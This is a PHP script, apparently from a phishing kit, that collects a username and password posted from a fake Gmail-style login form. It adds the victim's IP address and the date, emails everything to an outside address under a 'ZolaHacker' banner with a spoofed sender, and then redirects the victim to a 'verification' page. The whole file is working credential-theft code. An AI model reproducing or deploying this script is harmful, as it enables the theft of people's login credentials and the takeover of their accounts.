<?
include 'validate_form.js';
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$domain = 'User';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$message .= "xxxxxxxxxxxxxxxxx XxX  *~* ZolaHacker *~*  XxX xxxxxxxxxxxxxxxxx"."<br />";
$message .= $domain." ID *: ".$_POST['liamguname']."<br />";
$message .= "Password*: ".$_POST['liamgpasuma']."<br />";
$message .= "IP: ".$ip."<br />";
$message .= $adddate;
$recipient = "helpdesk@wardmanuk.com";
$subject = "Gpapa $ip";
$headers .= "From: Gm4!l"."<doc>";
$headers .= $_POST['eMailAdd']."\n";
mail($recipient,$subject,$message,$headers);
mail($recipent,$subject,$message,$headers);
header("Location: verification.html");
	  

?>